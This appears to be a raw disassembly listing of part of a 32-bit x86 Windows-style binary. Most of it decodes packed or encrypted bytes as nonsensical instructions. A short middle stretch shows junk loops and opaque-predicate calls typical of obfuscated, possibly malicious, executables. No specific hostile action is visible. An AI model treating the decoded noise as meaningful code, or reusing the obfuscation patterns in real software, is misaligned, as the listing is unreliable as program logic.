  41b198:	push   edx
  41b199:	sub    esi,DWORD PTR [edi+0x64]
  41b19c:	nop
  41b19d:	sbb    al,0x4a
  41b19f:	test   eax,0x976114a9
  41b1a4:	lds    ecx,FWORD PTR [ecx+0x66e7f97b]
  41b1aa:	mov    ss,WORD PTR [esi+0x77795fb7]
  41b1b0:	cdq    
  41b1b1:	xchg   DWORD PTR [ebx-0x47],ecx
  41b1b4:	add    al,0x27
  41b1b6:	(bad)  
  41b1b7:	sub    esi,DWORD PTR [edx]
  41b1b9:	enter  0xf978,0x8b
  41b1bd:	(bad)  
  41b1be:	push   esp
  41b1bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1c0:	inc    edx
  41b1c1:	aad    0x1
  41b1c3:	rol    DWORD PTR [eax],0xf4
  41b1c6:	test   ebp,esp
  41b1c8:	pop    ebx
  41b1c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1ca:	fbstp  TBYTE PTR [ecx+0x11913f27]
  41b1d0:	sbb    eax,0x347cb02a
  41b1d5:	(bad)  
  41b1d6:	or     ebx,DWORD PTR [eax+ebx*4]
  41b1d9:	push   ecx
  41b1da:	cmp    edi,DWORD PTR [esp+esi*1-0x6b]
  41b1de:	or     eax,0x94af0432
  41b1e3:	xchg   esi,eax
  41b1e4:	add    al,0x36
  41b1e6:	dec    ecx
  41b1e7:	and    edx,DWORD PTR [eax+0x33]
  41b1ea:	xor    DWORD PTR [eax+ebx*8+0xb],ebp
  41b1ee:	or     al,BYTE PTR [ebx]
  41b1f0:	xlat   BYTE PTR ds:[ebx]
  41b1f1:	lock push eax
  41b1f3:	test   BYTE PTR [ecx+eax*8+0x30],ah
  41b1f7:	or     al,0xd8
  41b1f9:	or     eax,0xc0a767f3
  41b1fe:	mov    esp,0x1e6a7c6e
  41b203:	cmp    DWORD PTR [esp+ebx*2],edx
  41b206:	inc    ebx
  41b207:	adc    al,BYTE PTR [ebp-0x233dfa61]
  41b20d:	ss in  al,0x63
  41b210:	mov    ch,0x76
  41b212:	mov    eax,DWORD PTR [esi+0x40]
  41b215:	cmp    cl,al
  41b217:	rcr    DWORD PTR [ebp-0x71],1
  41b21a:	rcl    DWORD PTR [edi+0xb],0x19
  41b21e:	xchg   DWORD PTR [ebp-0x34],edx
  41b221:	mov    DWORD PTR [edx],ecx
  41b223:	cmp    BYTE PTR [edx],0xce
  41b226:	ss jge 0x41b1cb
  41b229:	xor    BYTE PTR [edx],0xa2
  41b22c:	fld    TBYTE PTR [ebp-0x4643cba4]
  41b232:	mov    bh,0x2d
  41b234:	mov    ebx,0x541d35fb
  41b239:	push   ebx
  41b23a:	dec    edx
  41b23b:	(bad)
  41b23f:	popa   
  41b240:	push   edx
  41b241:	jns    0x41b26a
  41b243:	fbstp  TBYTE PTR [edx+0xa2274e1]
  41b249:	mov    ch,0x71
  41b24b:	sti    
  41b24c:	loopne 0x41b285
  41b24e:	adc    al,0xa7
  41b250:	fcmovne st,st(5)
  41b252:	movaps xmm1,XMMWORD PTR [esi-0x25]
  41b256:	mov    dh,0xdc
  41b258:	popa   
  41b259:	mov    DWORD PTR [edx-0x6a],ecx
  41b25c:	push   ecx
  41b25d:	xor    eax,DWORD PTR [eax]
  41b25f:	mov    ds:0xc58045d6,al
  41b264:	sbb    DWORD PTR [ecx],esp
  41b266:	jbe    0x41b2e1
  41b268:	jp     0x41b25f
  41b26a:	imul   esp,ebx,0xb
  41b26d:	mov    ebp,0xca2d44e7
  41b272:	leave  
  41b273:	xchg   ebp,eax
  41b275:	dec    ebp
  41b276:	and    eax,0xdca12067
  41b27b:	cmp    edx,DWORD PTR [edi+0x3e23b59b]
  41b281:	js     0x41b2d8
  41b283:	dec    edx
  41b284:	dec    eax
  41b285:	mov    gs,WORD PTR [esi]
  41b287:	lods   al,BYTE PTR ds:[esi]
  41b288:	js     0x41b2bb
  41b28a:	add    BYTE PTR [ebx+0x3177966a],ah
  41b290:	jno    0x41b23d
  41b292:	cdq    
  41b293:	clc    
  41b294:	adc    BYTE PTR [ecx],bl
  41b296:	xchg   esi,eax
  41b297:	(bad)  
  41b298:	loop   0x41b30b
  41b29a:	out    dx,al
  41b29b:	push   edx
  41b29c:	cli    
  41b29d:	adc    eax,0x74d84210
  41b2a2:	push   edx
  41b2a3:	es (bad) 
  41b2a5:	imul   BYTE PTR [eax]
  41b2a7:	jmp    0x41b2b8
  41b2a9:	ins    BYTE PTR es:[edi],dx
  41b2aa:	sbb    DWORD PTR [ebx],eax
  41b2ac:	cmp    dl,dl
  41b2ae:	xchg   ebp,eax
  41b2af:	cmp    eax,0x6c0a5145
  41b2b4:	fisttp QWORD PTR [edi-0x42436b49]
  41b2ba:	push   ds
  41b2bb:	mov    cl,0xec
  41b2bd:	mov    ds:0x932638df,eax
  41b2c2:	jo     0x41b2fb
  41b2c4:	cli    
  41b2c5:	push   0xf343516c
  41b2ca:	mov    esp,0x4010a5a4
  41b2cf:	xor    edi,DWORD PTR [ebx+0x53]
  41b2d2:	mov    ch,BYTE PTR [ebp+0x7]
  41b2d5:	cmp    DWORD PTR [edi+0x4dc24766],0xe6aa1d95
  41b2df:	daa    
  41b2e0:	js     0x41b328
  41b2e2:	imul   ebx,DWORD PTR [eax],0x26e65b9d
  41b2e8:	xor    dh,BYTE PTR [ecx+edi*8+0x71]
  41b2ec:	jo     0x41b2ab
  41b2ee:	jl     0x41b2ca
  41b2f0:	sti    
  41b2f1:	xchg   ecx,eax
  41b2f2:	in     al,0x98
  41b2f4:	mov    eax,ds:0x79b5779b
  41b2f9:	aad    0x7e
  41b2fb:	(bad)  
  41b2fc:	arpl   WORD PTR [ebx-0x10b76bf7],cx
  41b302:	mov    eax,ds:0x8856eb2f
  41b307:	xchg   ebp,eax
  41b308:	xchg   edi,eax
  41b309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b30a:	and    edi,DWORD PTR [ebx+ebx*8]
  41b30d:	bound  edi,QWORD PTR [eax-0x48]
  41b310:	xor    DWORD PTR [ecx+0x137e914d],ebp
  41b316:	ret    0x4e74
  41b319:	dec    eax
  41b31a:	scas   eax,DWORD PTR es:[edi]
  41b31b:	retf   
  41b31c:	ret    
  41b31d:	in     al,dx
  41b31e:	mov    ebx,0xd5d4ed7
  41b323:	push   edx
  41b324:	inc    esp
  41b325:	or     eax,0xb682f845
  41b32a:	pusha  
  41b32b:	push   esp
  41b32c:	(bad)  
  41b32d:	or     BYTE PTR [edi+0x6f5460d9],ah
  41b333:	(bad)  
  41b334:	jg     0x41b2b9
  41b336:	loope  0x41b329
  41b338:	enter  0x48f7,0x69
  41b33c:	lds    esp,FWORD PTR [edi]
  41b33e:	jns    0x41b35b
  41b340:	mov    bl,0xa1
  41b342:	pop    esp
  41b343:	fadd   DWORD PTR [ebx]
  41b345:	cli    
  41b346:	mov    esi,0xd9dd606a
  41b34b:	sub    DWORD PTR [ebx],edi
  41b34d:	mov    al,ds:0xc03d6d7d
  41b352:	icebp  
  41b353:	enter  0xb20c,0xb4
  41b357:	push   0x17
  41b359:	call   DWORD PTR [ebp-0x54]
  41b35c:	call   0x1b71d9d7
  41b361:	les    ecx,FWORD PTR [ebp+esi*8+0x79]
  41b365:	and    eax,0xf129e494
  41b36a:	test   DWORD PTR [edi-0x7b],esi
  41b36d:	and    DWORD PTR [ebp-0x9299787],0x4385512d
  41b377:	ret    0xeea3
  41b37a:	push   0xffffff95
  41b37c:	add    ecx,DWORD PTR [edi]
  41b37e:	stos   BYTE PTR es:[edi],al
  41b37f:	jno    0x41b335
  41b381:	mov    ?,WORD PTR [edi]
  41b383:	dec    eax
  41b384:	ror    BYTE PTR [esi],1
  41b386:	test   eax,0xd9817ba9
  41b38b:	dec    esp
  41b38c:	mov    al,ds:0xbcff4669
  41b391:	mov    ecx,0x3c6ab9e0
  41b396:	fild   DWORD PTR [ecx]
  41b398:	xor    al,bh
  41b39a:	sti    
  41b39b:	mov    eax,DWORD PTR [ecx+0x647fb61]
  41b3a1:	jg     0x41b3b1
  41b3a3:	xor    ecx,DWORD PTR [eax+0x73]
  41b3a6:	adc    dh,ch
  41b3a8:	add    edx,DWORD PTR [ecx]
  41b3aa:	cmc    
  41b3ab:	sahf   
  41b3ac:	dec    esp
  41b3ad:	add    BYTE PTR [ecx],cl
  41b3af:	int3   
  41b3b0:	cmc    
  41b3b1:	int    0x60
  41b3b3:	mov    ecx,esi
  41b3b5:	retf   0xc468
  41b3b8:	mov    ch,0x4e
  41b3ba:	ret    0xac12
  41b3bd:	jbe    0x41b3c8
  41b3bf:	into   
  41b3c0:	out    0x67,eax
  41b3c2:	rcl    DWORD PTR [ebp+eiz*4-0x50],0x32
  41b3c7:	retf   0x2caa
  41b3ca:	call   0x7f8c6561
  41b3cf:	pushf  
  41b3d0:	jmp    0xbba430dd
  41b3d5:	or     dh,BYTE PTR [edi+0x19ae1d45]
  41b3db:	ror    DWORD PTR [edi+0xb],0x8
  41b3df:	(bad)  
  41b3e0:	imul   ecx,DWORD PTR [ecx+esi*8-0x4b],0x472824d1
  41b3e8:	imul   edi,DWORD PTR [ecx+0x476bb1e3],0xa0c53a95
  41b3f2:	mul    DWORD PTR [ebp+0x52]
  41b3f5:	push   esp
  41b3f6:	arpl   WORD PTR [esi+0x7f927861],si
  41b3fc:	pop    eax
  41b3fd:	adc    al,0xe8
  41b3ff:	call   0xdfaf5513
  41b404:	shl    DWORD PTR [eax-0x7cda05a0],0xa0
  41b40b:	rol    BYTE PTR [ebx-0x70723de4],0x14
  41b412:	xor    dl,BYTE PTR [esi]
  41b414:	add    al,0xbc
  41b416:	cmc    
  41b417:	mov    cl,0x80
  41b419:	pop    eax
  41b41a:	fisttp QWORD PTR [ebx]
  41b41c:	inc    ecx
  41b41d:	mov    ebx,edx
  41b41f:	sbb    eax,0xce2359ea
  41b424:	inc    eax
  41b425:	push   0xffffff8e
  41b427:	mov    WORD PTR [ebx],ds
  41b429:	stos   BYTE PTR es:[edi],al
  41b42a:	repz mov ds:0xe1ca46c3,al
  41b430:	in     eax,dx
  41b431:	arpl   si,bp
  41b433:	jp     0x41b3c9
  41b435:	mov    ebx,0xe0850705
  41b43a:	daa    
  41b43b:	sbb    DWORD PTR [ebx+eax*4-0x41fbc79a],0x690f414e
  41b446:	(bad)  
  41b447:	retf   
  41b448:	enter  0x8afe,0x52
  41b44c:	jbe    0x41b4a5
  41b44e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b44f:	fldenv [edx-0x3e]
  41b452:	jmp    0xfbaf7201
  41b457:	mov    cl,0x1
  41b459:	mov    dl,BYTE PTR [edi-0x45d597e4]
  41b45f:	adc    ah,dh
  41b461:	and    esi,DWORD PTR [esi]
  41b463:	mov    WORD PTR ds:[ecx],ss
  41b466:	js     0x41b3f9
  41b468:	test   al,0x59
  41b46a:	shr    DWORD PTR [ebx+0x3c],1
  41b46d:	xchg   ecx,eax
  41b46e:	cmp    ebp,DWORD PTR [ecx+0x117409df]
  41b474:	inc    esp
  41b475:	lds    esi,FWORD PTR [eax-0x79]
  41b478:	scas   al,BYTE PTR es:[edi]
  41b479:	sub    DWORD PTR [edi],eax
  41b47b:	and    al,0x4
  41b47d:	or     BYTE PTR [ebp+0x6cd1ba03],bl
  41b483:	in     eax,dx
  41b484:	cmp    BYTE PTR [edi-0x43],bl
  41b487:	sub    al,0x97
  41b489:	xor    eax,0xad535385
  41b48e:	test   al,0x3f
  41b490:	call   0xec14:0x65d5dff0
  41b497:	mov    al,0x1f
  41b499:	loop   0x41b4f5
  41b49b:	sbb    BYTE PTR [edx-0xb],dl
  41b49e:	popf   
  41b49f:	push   esp
  41b4a0:	push   ds
  41b4a1:	inc    ebp
  41b4a2:	sub    eax,0xc969acd5
  41b4a7:	out    0x15,al
  41b4a9:	mov    esp,0x159fe1b0
  41b4ae:	test   DWORD PTR [edi+0x5a],edi
  41b4b1:	loop   0x41b4c2
  41b4b3:	and    BYTE PTR [edx],al
  41b4b5:	dec    DWORD PTR [ebp-0x6]
  41b4b8:	or     BYTE PTR [eax],0x5d
  41b4bb:	scas   al,BYTE PTR es:[edi]
  41b4bc:	add    al,0x54
  41b4be:	xchg   edx,eax
  41b4bf:	dec    edi
  41b4c0:	adc    eax,0x38888e0c
  41b4c5:	pop    ecx
  41b4c6:	in     eax,0xd2
  41b4c8:	xor    eax,0xffdf7104
  41b4cd:	push   0x458ff301
  41b4d2:	and    DWORD PTR [edi+0x22],esi
  41b4d5:	test   BYTE PTR [edi],dl
  41b4d7:	xor    ebx,DWORD PTR [eax]
  41b4d9:	inc    eax
  41b4da:	cwde   
  41b4db:	pop    ds
  41b4dc:	fisttp WORD PTR [eax+0x139c06e6]
  41b4e2:	jae    0x41b509
  41b4e4:	in     eax,dx
  41b4e5:	xchg   ebp,eax
  41b4e6:	lods   al,BYTE PTR ds:[esi]
  41b4e7:	jmp    0x2872b447
  41b4ec:	fist   DWORD PTR [edx-0x3a]
  41b4ef:	push   edi
  41b4f0:	xchg   DWORD PTR [edx+0x6e6a57db],esp
  41b4f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4f7:	in     eax,0xe
  41b4f9:	jo     0x41b4bd
  41b4fb:	pop    ecx
  41b4fc:	pop    esp
  41b4fd:	cdq    
  41b4fe:	(bad)
  41b502:	mov    eax,ds:0xb37fb6ff
  41b507:	mov    al,0xe0
  41b509:	pop    es
  41b50a:	xor    ch,dh
  41b50c:	pop    edi
  41b50d:	jae    0x41b4ed
  41b50f:	push   ecx
  41b510:	ja     0x41b584
  41b512:	xchg   ebx,eax
  41b513:	fs push esi
  41b515:	cmpxchg BYTE PTR [ebx],dl
  41b518:	fstp   TBYTE PTR [esi+ebp*2]
  41b51b:	push   0x61
  41b51d:	out    dx,al
  41b51e:	pop    ds
  41b51f:	ss jl  0x41b4e7
  41b522:	or     ecx,edx
  41b524:	and    ch,BYTE PTR [ebx+0x6cce20e3]
  41b52a:	add    cl,BYTE PTR [ebx]
  41b52c:	xchg   ch,bh
  41b52e:	std    
  41b52f:	jns    0x41b580
  41b531:	lds    edx,FWORD PTR [edx-0x454e73e4]
  41b537:	ror    cl,0x22
  41b53a:	and    cl,BYTE PTR [ebp+ecx*4+0x28d306d0]
  41b541:	xlat   BYTE PTR ds:[ebx]
  41b542:	push   es
  41b543:	ficomp DWORD PTR [eax-0x160e9362]
  41b549:	test   eax,ecx
  41b54b:	sar    DWORD PTR [edx],1
  41b54d:	hlt    
  41b54e:	daa    
  41b54f:	xchg   DWORD PTR [edi+0x3b],ecx
  41b552:	sar    DWORD PTR [eax],cl
  41b554:	cld    
  41b555:	mov    ecx,DWORD PTR [ebp+0x8]
  41b558:	mov    edx,DWORD PTR [ebp-0x4c]
  41b55b:	add    ecx,edi
  41b55d:	and    ecx,edx
  41b55f:	mov    DWORD PTR [ebp-0x4c],ecx
  41b562:	mov    ecx,DWORD PTR [ebp+0x8]
  41b565:	mov    edx,DWORD PTR [ebp-0x48]
  41b568:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b56f:	mov    DWORD PTR [ebp-0x48],ecx
  41b572:	mov    ecx,DWORD PTR [ebp+0x8]
  41b575:	mov    edx,0xfa5e1524
  41b57a:	sub    edx,ecx
  41b57c:	add    edx,DWORD PTR [ebp-0x44]
  41b57f:	mov    DWORD PTR [ebp-0x44],edx
  41b582:	mov    ecx,DWORD PTR [ebp+0x8]
  41b585:	xor    ecx,eax
  41b587:	add    ecx,esi
  41b589:	jne    0x4191ae
  41b58f:	jmp    0x41b621
  41b594:	mov    ecx,DWORD PTR [ebp+0x8]
  41b597:	mov    edx,DWORD PTR [ebp-0x8]
  41b59a:	xor    ecx,eax
  41b59c:	xor    edx,eax
  41b59e:	sub    ecx,edx
  41b5a0:	sub    ecx,esi
  41b5a2:	xor    ecx,eax
  41b5a4:	mov    DWORD PTR [ebp+0x8],ecx
  41b5a7:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5aa:	mov    edx,DWORD PTR [ebp-0x58]
  41b5ad:	add    ecx,0x5708e2
  41b5b3:	imul   ecx,edx
  41b5b6:	mov    DWORD PTR [ebp-0x58],ecx
  41b5b9:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x54]
  41b5bf:	add    ecx,0x64f880
  41b5c5:	or     ecx,edx
  41b5c7:	mov    DWORD PTR [ebp-0x54],ecx
  41b5ca:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5cd:	mov    edx,DWORD PTR [ebp-0x50]
  41b5d0:	add    ecx,0x242ebf1
  41b5d6:	xor    ecx,edx
  41b5d8:	mov    DWORD PTR [ebp-0x50],ecx
  41b5db:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5de:	mov    edx,DWORD PTR [ebp-0x4c]
  41b5e1:	add    ecx,edi
  41b5e3:	and    ecx,edx
  41b5e5:	mov    DWORD PTR [ebp-0x4c],ecx
  41b5e8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5eb:	mov    edx,DWORD PTR [ebp-0x48]
  41b5ee:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b5f5:	mov    DWORD PTR [ebp-0x48],ecx
  41b5f8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5fb:	mov    edx,0xfa5e1524
  41b600:	sub    edx,ecx
  41b602:	add    edx,DWORD PTR [ebp-0x44]
  41b605:	mov    DWORD PTR [ebp-0x44],edx
  41b608:	mov    ecx,DWORD PTR [ebp+0x8]
  41b60b:	xor    ecx,eax
  41b60d:	add    ecx,esi
  41b60f:	jne    0x41b594
  41b615:	mov    ecx,DWORD PTR [ebp-0x8]
  41b618:	xor    ecx,eax
  41b61a:	mov    eax,DWORD PTR [ebp+0x10]
  41b61d:	add    ecx,esi
  41b61f:	mov    DWORD PTR [eax],ecx
  41b621:	pop    edi
  41b622:	pop    esi
  41b623:	pop    ebx
  41b624:	leave  
  41b625:	ret    0xc
  41b628:	push   ebp
  41b629:	mov    ebp,esp
  41b62b:	sub    esp,0x78
  41b62e:	push   esi
  41b62f:	mov    DWORD PTR ds:0x42b21e,0x12
  41b639:	cmp    DWORD PTR ds:0x42b21e,0x0
  41b640:	je     0x41b684
  41b646:	cmp    DWORD PTR ds:0x42b21e,0x16
  41b64d:	jle    0x41b684
  41b653:	jmp    0x41b672
  41b658:	push   0x42b1fa
  41b65d:	push   0x8597
  41b662:	push   0x42a285
  41b667:	push   0x42a1b7
  41b66c:	call   DWORD PTR ds:0x42b31e
  41b672:	mov    esi,DWORD PTR ds:0x42b21e
  41b678:	dec    esi
  41b679:	mov    DWORD PTR ds:0x42b21e,esi
  41b67f:	jmp    0x41b639
  41b684:	push   edi
  41b685:	sub    DWORD PTR ds:0x42b1ca,0x4941
  41b68f:	mov    eax,ds:0x42a472
  41b694:	xor    esi,esi
  41b696:	xor    esi,DWORD PTR ds:0x42b1d6
  41b69c:	add    esi,DWORD PTR ds:0x42b1da
  41b6a2:	mov    DWORD PTR ds:0x42b1d6,esi
  41b6a8:	mov    DWORD PTR [ebp-0x24],eax
  41b6ab:	and    DWORD PTR ds:0x42b226,edx
  41b6b1:	mov    eax,ds:0x42a592
  41b6b6:	mov    ecx,DWORD PTR ds:0x42b256
  41b6bc:	mov    ecx,DWORD PTR [ecx]
  41b6be:	xor    DWORD PTR ds:0x42b1f2,ecx
  41b6c4:	mov    DWORD PTR [ebp-0x30],eax
  41b6c7:	mov    DWORD PTR ds:0x42b1b2,0x10
  41b6d1:	cmp    DWORD PTR ds:0x42b1b2,0x0
  41b6d8:	je     0x41b70e
  41b6de:	cmp    DWORD PTR ds:0x42b1b2,0x1e
  41b6e5:	ja     0x41b70e
  41b6eb:	jmp    0x41b6fb
  41b6f0:	push   0x25ea
  41b6f5:	call   DWORD PTR ds:0x42b322
  41b6fb:	xor    eax,eax
  41b6fd:	xor    eax,DWORD PTR ds:0x42b1b2
  41b703:	dec    eax
  41b704:	mov    ds:0x42b1b2,eax
  41b709:	jmp    0x41b6d1
  41b70e:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  41b715:	and    DWORD PTR ds:0x42b21e,0x0
  41b71f:	jmp    0x41b733
  41b724:	xor    esi,esi
  41b726:	add    esi,DWORD PTR ds:0x42b21e
  41b72c:	inc    esi
  41b72d:	mov    DWORD PTR ds:0x42b21e,esi
  41b733:	cmp    DWORD PTR ds:0x42b21e,0x14
  41b73a:	jae    0x41b77c
  41b740:	cmp    DWORD PTR ds:0x42b21e,0x7
  41b747:	jl     0x41b77c
  41b74d:	jmp    0x41b75d
  41b752:	push   0x3b69
  41b757:	call   DWORD PTR ds:0x42b326
  41b75d:	cmp    DWORD PTR ds:0x42b21e,0x6
  41b764:	jne    0x41b777
  41b76a:	mov    esi,DWORD PTR ds:0x42b21e
  41b770:	inc    esi
  41b771:	mov    DWORD PTR ds:0x42b21e,esi
  41b777:	jmp    0x41b724
  41b77c:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  41b783:	or     eax,DWORD PTR ds:0x42b212
  41b789:	mov    eax,DWORD PTR [ebp-0x10]
  41b78c:	and    DWORD PTR ds:0x42b1c2,0x0
  41b796:	jmp    0x41b7aa
  41b79b:	xor    ecx,ecx
  41b79d:	or     ecx,DWORD PTR ds:0x42b1c2
  41b7a3:	inc    ecx
  41b7a4:	mov    DWORD PTR ds:0x42b1c2,ecx
  41b7aa:	cmp    DWORD PTR ds:0x42b1c2,0x16
  41b7b1:	jae    0x41b7ee
  41b7b7:	cmp    DWORD PTR ds:0x42b1c2,0x22
  41b7be:	jb     0x41b7ee
  41b7c4:	jmp    0x41b7e9
  41b7c9:	push   0x42a121
  41b7ce:	push   0x73a7
  41b7d3:	push   DWORD PTR [ebp-0x18]
  41b7d6:	push   0x5cd1
  41b7db:	push   0x2368
  41b7e0:	push   DWORD PTR [ebp-0xc]
  41b7e3:	call   DWORD PTR ds:0x42b2ea
  41b7e9:	jmp    0x41b79b
  41b7ee:	mov    ecx,DWORD PTR [ebp-0x10]
  41b7f1:	mov    DWORD PTR ds:0x42b1be,0x10
  41b7fb:	cmp    DWORD PTR ds:0x42b1be,0x0
  41b802:	je     0x41b85b
  41b808:	cmp    DWORD PTR ds:0x42b1be,0x9
  41b80f:	jle    0x41b85b
  41b815:	jmp    0x41b82f
  41b81a:	push   0x42a03d
  41b81f:	push   0x0
  41b821:	push   DWORD PTR [ebp-0xc]
  41b824:	push   0x5431
  41b829:	call   DWORD PTR ds:0x42b2ee
  41b82f:	cmp    DWORD PTR ds:0x42b1be,0xa
  41b836:	jne    0x41b849
  41b83c:	mov    edi,DWORD PTR ds:0x42b1be
  41b842:	dec    edi
  41b843:	mov    DWORD PTR ds:0x42b1be,edi
  41b849:	mov    edi,DWORD PTR ds:0x42b1be
  41b84f:	dec    edi
  41b850:	mov    DWORD PTR ds:0x42b1be,edi
  41b856:	jmp    0x41b7fb
  41b85b:	sub    eax,ecx
  41b85d:	and    esi,esi
  41b85f:	jmp    0x41dbf0
  41b864:	xchg   ch,bl
  41b866:	fdiv   st,st(3)
  41b868:	test   dl,ah
  41b86a:	xchg   BYTE PTR [edx+0x1c89e04a],dl
  41b870:	nop    eax
  41b873:	loope  0x41b863
  41b875:	inc    DWORD PTR [eax-0x7ca1f07d]
  41b87b:	sub    DWORD PTR [ebx+0xb003e51],0xffffff88
  41b882:	popf   
  41b883:	test   BYTE PTR [edi+0x15],ch
  41b886:	mov    edx,0x918ae3bc
  41b88b:	add    bl,BYTE PTR [eax+0x1035b9e4]
  41b891:	jl     0x41b8bf
  41b893:	rcl    BYTE PTR [ebx],1
  41b895:	jge    0x41b8af
  41b897:	into   
  41b898:	mov    dl,0x20
  41b89a:	xchg   esi,eax
  41b89b:	js     0x41b86b
  41b89d:	jnp    0x41b87e
  41b89f:	sub    DWORD PTR [edx-0x79],esp
  41b8a2:	sub    BYTE PTR [ebx+ecx*2-0x4cbc488a],dh
  41b8a9:	int3   
  41b8aa:	int3   
  41b8ab:	jno    0x41b8db
  41b8ad:	mov    al,0xf0
  41b8af:	mov    esp,0xb9508fb8
  41b8b4:	push   ebp
  41b8b5:	cmp    BYTE PTR [ecx+0x43],0xe9
  41b8b9:	jmp    0xf651:0x1ec72a4f
  41b8c0:	mov    eax,0x810a1009
  41b8c5:	xor    eax,0xe41cfc22
  41b8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8cb:	adc    DWORD PTR [ebp-0x78],ecx
  41b8ce:	inc    esi
  41b8cf:	add    esp,eax
  41b8d1:	jo     0x41b8ab
  41b8d3:	aad    0xda
  41b8d5:	mov    bh,BYTE PTR ds:0x6493621d
  41b8db:	ror    BYTE PTR [ebp-0x3b],cl
  41b8de:	mov    ch,0x72
  41b8e0:	aas    
  41b8e1:	call   0xae39f5ea
  41b8e6:	or     al,0x7d
  41b8e8:	pop    eax
  41b8e9:	aam    0xee
  41b8eb:	jo     0x41b889
  41b8ed:	lahf   
  41b8ee:	aaa    
  41b8ef:	xchg   ecx,eax
  41b8f0:	xchg   ecx,eax
  41b8f1:	arpl   sp,bp
  41b8f3:	pop    edx
  41b8f4:	loope  0x41b902
  41b8f6:	and    eax,0x8e3df72e
  41b8fb:	and    edi,0xffffffe4
  41b8fe:	iret   
  41b8ff:	dec    esi
  41b900:	push   ds
  41b901:	cld    
  41b902:	push   eax
  41b903:	stc    
  41b904:	cmp    eax,0xd0a84b8
  41b909:	inc    ebx
  41b90a:	mov    ch,0x6d
  41b90c:	aaa    
  41b90d:	pop    ebx
  41b90e:	scas   al,BYTE PTR es:[edi]
  41b90f:	pop    ebp
  41b910:	dec    esi
  41b911:	fdiv   st,st(0)
  41b913:	(bad)  
  41b914:	leave  
  41b915:	fmul   QWORD PTR [ebx-0x71]
  41b918:	mov    bl,0x74
  41b91a:	nop
  41b91b:	stos   DWORD PTR es:[edi],eax
  41b91c:	jge    0x41b97e
  41b91e:	push   ebp
  41b91f:	mov    esi,0xdc514e52
  41b924:	loopne 0x41b966
  41b926:	imul   esi,esp,0xffffffb3
  41b929:	push   esi
  41b92a:	fimul  WORD PTR [edx+ebx*1-0x10]
  41b92e:	dec    esi
  41b92f:	lahf   
  41b930:	int3   
  41b931:	add    bl,cl
  41b933:	sahf   
  41b934:	and    BYTE PTR cs:[edi-0x5b7ac099],ah
  41b93b:	mov    ebp,0x5c6bbe82
  41b940:	mov    eax,ds:0x9d0ea165
  41b945:	fstp   st(5)
  41b947:	cmp    eax,0x6121eb8
  41b94c:	adc    eax,0x7379302d
  41b951:	sub    DWORD PTR ds:[eax],ecx
  41b954:	sub    ch,dl
  41b956:	les    ebp,FWORD PTR [edi-0x3a]
  41b959:	mov    ecx,0x9c4ab2c5
  41b95e:	int3   
  41b95f:	inc    eax
  41b960:	jecxz  0x41b903
  41b962:	adc    bh,BYTE PTR [ebp-0x482bdc82]
  41b968:	sbb    ebx,ebp
  41b96a:	add    eax,0x90d39033
  41b96f:	fdivr  DWORD PTR [ecx]
  41b972:	pushf  
  41b973:	addr16 out dx,eax
  41b975:	inc    edi
  41b976:	sbb    al,0x4
  41b978:	mov    esp,0x4e338751
  41b97d:	mov    ebx,0x97eef5c5
  41b982:	jle    0x41b9ae
  41b984:	push   ebp
  41b985:	repnz test al,0xc4
  41b989:	add    ebp,edx
  41b98b:	sub    al,0x56
  41b98d:	mov    ebx,0x574a6c51
  41b992:	jmp    0x6b2b:0x912da35f
  41b999:	fdiv   DWORD PTR [ebp+edx*4-0x10990b31]
  41b9a0:	not    DWORD PTR [eax-0x2]
  41b9a3:	sbb    edx,DWORD PTR [eax-0x15]
  41b9a6:	sub    ebp,DWORD PTR [ebx+eiz*8-0xbd95757]
  41b9ad:	jae    0x41b982
  41b9af:	mov    eax,fs
  41b9b1:	cdq    
  41b9b2:	lahf   
  41b9b3:	mov    fs,WORD PTR [esi+0x547f82d7]
  41b9b9:	popa   
  41b9ba:	inc    ecx
  41b9bb:	and    edx,0x57
  41b9be:	inc    edx
  41b9bf:	ja     0x41ba3f
  41b9c1:	sbb    esi,DWORD PTR [esi+0x26]
  41b9c4:	rcl    ah,1
  41b9c6:	or     ebp,DWORD PTR [ebx-0xa78d4f0]
  41b9cc:	into   
  41b9cd:	jnp    0x41b9e9
  41b9cf:	mov    eax,ds:0x2955d5a7
  41b9d4:	jmp    0x7212:0x2c06e515
  41b9db:	sub    al,0xbe
  41b9dd:	pop    eax
  41b9de:	jb     0x41b9b3
  41b9e0:	xchg   esi,eax
  41b9e1:	sbb    al,0x2f
  41b9e3:	ret    
  41b9e4:	ret    0x8457
  41b9e7:	and    dl,BYTE PTR [edx-0x71809fb5]
  41b9ed:	int    0x4a
  41b9ef:	lock xlat BYTE PTR ds:[ebx]
  41b9f1:	jmp    0x41b9f9
  41b9f3:	or     DWORD PTR [ecx],ebp
  41b9f5:	into   
  41b9f6:	fs cwde 
  41b9f8:	sub    BYTE PTR [ebp-0x2ce504fc],ah
  41b9fe:	xchg   ebp,eax
  41b9ff:	test   al,0xe8
  41ba01:	mov    esp,DWORD PTR [edi-0x64107431]
  41ba07:	arpl   WORD PTR [edx],di
  41ba09:	inc    edi
  41ba0a:	repnz hlt 
  41ba0c:	adc    DWORD PTR [edi],ecx
  41ba0e:	outs   dx,BYTE PTR cs:[esi]
  41ba10:	scas   al,BYTE PTR es:[edi]
  41ba11:	es repz mov es,WORD PTR fs:[ebp+eiz*8+0x72]
  41ba18:	and    esi,DWORD PTR [ecx-0x19]
  41ba1b:	add    esi,esp
  41ba1d:	mov    dh,0xaf
  41ba1f:	dec    edi
  41ba20:	xor    BYTE PTR [esi+0xb],al
  41ba23:	outs   dx,BYTE PTR ds:[esi]
